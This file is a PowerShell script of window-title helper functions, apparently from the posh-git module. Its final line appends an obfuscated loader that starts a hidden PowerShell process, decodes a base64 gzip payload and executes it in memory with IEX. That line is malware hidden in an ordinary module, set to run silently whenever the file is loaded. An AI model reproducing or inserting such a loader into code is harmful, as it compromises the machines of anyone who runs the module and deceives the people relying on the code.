$HostSupportsSettingWindowTitle = $null
$OriginalWindowTitle = $null

function Test-WindowTitleIsWriteable {
    if ($null -eq $HostSupportsSettingWindowTitle) {
        
        try {
            $script:OriginalWindowTitle = $Host.UI.RawUI.WindowTitle
            $newTitle = "${OriginalWindowTitle} "
            $Host.UI.RawUI.WindowTitle = $newTitle
            $script:HostSupportsSettingWindowTitle = ($Host.UI.RawUI.WindowTitle -eq $newTitle)
            $Host.UI.RawUI.WindowTitle = $OriginalWindowTitle
            Write-Debug "HostSupportsSettingWindowTitle: $HostSupportsSettingWindowTitle"
            Write-Debug "OriginalWindowTitle: $OriginalWindowTitle"
        }
        catch {
            $script:OriginalWindowTitle = $null
            $script:HostSupportsSettingWindowTitle = $false
            Write-Debug "HostSupportsSettingWindowTitle error: $_"
        }
    }
    return $HostSupportsSettingWindowTitle
}

function Reset-WindowTitle {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute("PSUseShouldProcessForStateChangingFunctions", "")]
    param()
    $settings = $global:GitPromptSettings

    
    if ($HostSupportsSettingWindowTitle -and $OriginalWindowTitle -and $settings.WindowTitle) {
        Write-Debug "Resetting WindowTitle: '$OriginalWindowTitle'"
        $Host.UI.RawUI.WindowTitle = $OriginalWindowTitle
    }
}

function Set-WindowTitle {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute("PSUseShouldProcessForStateChangingFunctions", "")]
    param($GitStatus, $IsAdmin)
    $settings = $global:GitPromptSettings

    
    if ($settings.WindowTitle -and (Test-WindowTitleIsWriteable)) {
        try {
            if ($settings.WindowTitle -is [scriptblock]) {
                
                $windowTitleText = "$(& $settings.WindowTitle $GitStatus $IsAdmin)"
            }
            else {
                $windowTitleText = $ExecutionContext.SessionState.InvokeCommand.ExpandString("$($settings.WindowTitle)")
            }

            Write-Debug "Setting WindowTitle: $windowTitleText"
            $Host.UI.RawUI.WindowTitle = "$windowTitleText"
        }
        catch {
            Write-Debug "Error occurred during evaluation of `$GitPromptSettings.WindowTitle: $_"
        }
    }
}

if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAJblSlcCA71W+2/aSBD+uZX6P1gVEkYlYBOSKpEi3Zp3gnkZ2wGKqsVew8La69hrXr3+7zcmkMe1uevdSbfCYr0zszvzzTc79pLAEZQH0rLZDXurgeFI3z68f9fDEfYlOcPdrpKXMvyiv720HVIa5969A3GGiKF0I8kTFIZV7mMaTK+vK0kUkUA8vhcaRKA4Jv6MURLLOel3yV6QiJx1Z0viCOmblPlaaDA+w+yotqtgZ0GkMxS4qazNHZw6VjBCRoWc/fIlm5ucqdNC7SHBLJazxi4WxC+4jGVz0vdceuBwFxI5q1Mn4jH3RMGmwXmpYAYx9kgHdlsTnYgFd+NsDoKAX0REEgVSGk5q/yiVszDtRdxBrhuRGJQLrWDNV0TOBAljeek3eXI8fJAEgvoE5IJEPDRItKYOiQtNHLiMDIg3lTtkc4r5V43kl0ag1RNRLg/J+NFLnbsJI4+G2dyPfh7yl4PxOocQ/fcP7z+8907Jf1jX6cu8w+zd5DAn4KPc4zE96N1IwAYdjsOCRzt4zQyjhOSm0iSFfjKdSpn9Q3TFA7txNZzH+bf3UU9GYOL3ul83o9WdCesTi1N3CnbHDGWS7r7Nrd19n4zDVP4246rEowGp7gLsU+dEKvlnCSAeI4fACye1DngoZ48C4lYJI3MsUkzz0uRHs5pPxZOtllDmkgg5kMQYvIL85l4785gmOdsKdOIDcI/vWUiKB1QmJ+0jfXen09N3UMpWGI7jvNRLoJacvGQQzIibl1AQ06MIJYIfptlnd/WECergWJy2m+b+jOfx3AoPYhElDuQUMBgaIXEoZikkealJXaLtDDo/nZ/9KSAVzBgN5rDTGhICKykQhkiZEoGrr1iRKxhEtPyQER90D0VeZ3gOJX2sjAPF8Jy42bc8PpXAI99TjE7gvPAXEm8wLvKSRSMBd0aK9xPV/ptPL66OV95VInLMm3yqsYm2E2llZDZ6t0fbxoHERwAPcEUCoKpH3NdwTC7LhogASPljsUsrCMaoFTDd0VZURRuqtnR4THre4tXP7t3tslmMqtuFh1pxS2/2qv1ms7y+NayyMGotcddrCb12v1waqDkwR2LcQs0hVVaj8j68pXujjdzRtni51/YbRdvul3PXG1U9b/7ZMwbqRZ227UpfU0q4Xa0lbVvbaEo5rtFNs0/N/uq2LmYji2HTK87v1StMt+1oaal85lsKaizOsX0RWo2F7u5GzeKVuS2pnaEJD66GNsFeUbVgPoe10sKp9RG67DlpuGvXV1f9Vb1jVBddq7E1Ouq45ii32/FQY65i9UZ7pPTtsDa0y1ti66WZ2SrPzJXSMcNIt1u7vjlXXbtWchsqm9XHbbIKY3zeaQ9qtYvOcFDGfr06s2Mx9MfV2dDdtC0WGMOBgfcdjPdWMrBcZdYcKaZa282swaBT6igmu9qjusatsu9t10WLOuMhRmhXbg3SmO5NdcwvVTPpFosW8/ndfYkifYMQJdqDVtcemiB3TUwWYGsecBjzdn80IqC/cDS1UrtSS2TRTgHAK40jDSaNOUI1hACfUVjvseKVDXbd2wvV5ShlRr1jY+3OpqRdVEf3yNU/tbVNs5rud2Etq/efFudFGG6jvhkZF8lsp4ZO5WLt+A5KihWVs/EDqveKav/m5mPKaSB1ZnOuvKDnW41Kx1G8wAxoCy3odLvUeVQ/tpMep6mFLD9/U6xIFBAGzRja9akeEWPcSRvboftAU31sdVO4YEyYnpd+OstJT4q55453Wrq+HoOrUNynaiu0STAXi7yyPVcUaF7KtqxAtL8eYoWHO/lpu3zaAFOYXh7BDkfk0mrPPCxn5v8A4fGiWcCf+3cQPq/9hfSXYFXyh9B/WH298I/g/Xfh25gKUDfgpmTksbn/HIUjZ158GqUJAjZ4x5F+mHYTcdaBL6Y/AFNu0WoMCwAA''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

